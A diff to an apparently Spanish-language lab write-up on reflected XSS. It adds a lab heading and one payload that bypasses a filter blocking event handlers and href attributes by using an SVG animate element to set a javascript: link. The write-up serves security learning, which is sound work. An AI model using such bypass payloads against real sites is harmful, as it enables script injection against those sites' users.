@@ -276,7 +276,15 @@ Entonces vamos al home del laboratorio para verificar que lo completamos.
 
 ![](img27.png)
 
-## 8. Lab: Reflected XSS with event handlers and `href` attributes blocked
+## 8. Lab: Reflected XSS with event handlers and href attributes blocked
+
+```
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+```
+
+![](img28.png)
+
+## 9. Lab: Reflected XSS with some SVG markup allowed
 
 
 
